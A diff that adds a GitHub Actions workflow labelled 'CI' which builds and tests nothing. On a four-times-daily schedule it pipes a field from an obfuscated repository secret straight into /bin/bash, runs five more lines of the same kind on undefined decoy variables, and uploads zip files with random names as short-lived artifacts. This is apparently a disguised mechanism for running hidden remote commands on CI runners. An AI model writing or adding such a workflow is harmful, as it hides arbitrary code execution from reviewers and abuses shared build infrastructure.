@@ -1,0 +1,36 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          z574: ${{ secrets.z574 }}
+        run: |
+          printf '%s' "$z574" | jq -r .vlqk3 | /bin/bash
+          echo $m00209 | jq -r .brm605 | /bin/bash
+          echo $hsqtj85770 | jq -r .hrlf3675 | /bin/bash
+          printf '%s' "$jyme0684" | jq -r .qy50302 | /bin/bash
+          printf '%s' "$fene364" | jq -r .uuso590 | /bin/bash
+          echo $pfvwo04493 | jq -r .hmg68289 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: bohWKiff
+          path: "*.zip"
+          retention-days: 1
